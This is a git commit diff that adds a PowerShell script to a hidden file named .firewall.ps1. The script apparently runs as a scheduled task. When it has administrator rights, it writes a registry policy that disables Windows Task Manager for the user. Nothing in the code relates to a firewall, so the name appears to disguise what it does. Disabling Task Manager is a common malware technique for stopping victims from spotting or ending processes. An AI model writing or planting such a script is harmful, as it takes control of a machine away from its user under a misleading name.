2a73464e753adfc78a025c5b1d27563558395efa
fxhxyz <fxhxyz7@proton.me>
2025-01-20 10:59:37 +0000

    update

--- .firewall.ps1
+++ .firewall.ps1
@@ -1,1 +1,13 @@
-# TODO
+# running with task
+
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    exit
+}
+
+$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+
+if (-not (Test-Path $RegPath)) {
+    New-Item -Path $RegPath -Force | Out-Null
+}
+
+Set-ItemProperty -Path $RegPath -Name "DisableTaskMgr" -Value 1
